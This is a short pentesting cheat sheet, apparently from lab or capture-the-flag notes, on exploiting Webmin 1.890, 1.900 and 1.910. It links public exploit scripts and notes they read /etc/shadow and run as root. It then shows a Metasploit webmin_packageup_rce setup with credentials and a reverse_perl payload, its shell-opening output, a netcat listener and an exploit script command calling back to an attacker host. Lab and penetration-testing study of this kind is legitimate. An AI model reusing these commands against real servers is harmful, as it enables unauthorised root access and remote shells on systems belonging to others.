# Webmin

### Webmin 1.8.90

* MiniServ 1.890 (Webmin httpd)
* https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890\_exploit.py
* Read /etc/shadow
* Add user
* Reverse Shells
* Read the config files
* Will run as root

### Webmin 1.900&#x20;

* MiniServ 1.900 (Webmin httpd)
* Requires credentials in order to exploit
* can use a metasploit module once credentials are obtained&#x20;

```
exploit/linux/http/webmin_packageup_rce
PASSWORD   Password6543     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.1.17      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                         -metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   admin            yes       Webmin Username

cmd/unix/reverse_perl
LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
   LPORT  8888             yes       The listen port

run

[*] Started reverse TCP handler on 10.10.14.2:8888 
[+] Session cookie: bda1415ad657230f23aac213aa96a878
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.2:8888 -> 10.10.110.3:10784) at 2024-04-13 21:21:53 -0400
```

### Webmin Version 1.910 - Privilege Escalation

* Authenticated
* https://github.com/roughiz/Webmin-1.910-Exploit-Script
* Start your virtual env

```
source venv/bin/activate
```

* start your listener

```
nc -nlvp 443
```

* Send it

```
python2 webmin_exploit.py --rhost 10.129.2.1 --rport 10000 --lhost 10.10.14.76 --lport 443 -u Matt -p computer2008 -s True
```
